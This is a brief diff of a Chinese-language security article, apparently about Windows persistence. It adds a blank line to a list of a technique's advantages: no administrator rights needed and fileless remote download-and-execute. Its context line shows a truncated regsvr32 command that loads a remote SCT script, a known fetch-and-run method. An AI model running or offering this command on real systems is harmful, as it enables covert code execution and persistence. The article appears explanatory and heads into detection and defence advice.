@@ -174,6 +174,7 @@ regsvr32 /u /s /i:https://raw.githubusercontent.com/3gstudent/SCTPersistence/mas
 优点如下：
 
 1.不需要管理员权限，只需要普通用户权限即可
+
 2.payload扩展性高，同其他方法结合(如sct)可实现远程下载执行，不需要向硬盘写入文件
 
 ## 0x07 检测和防御建议
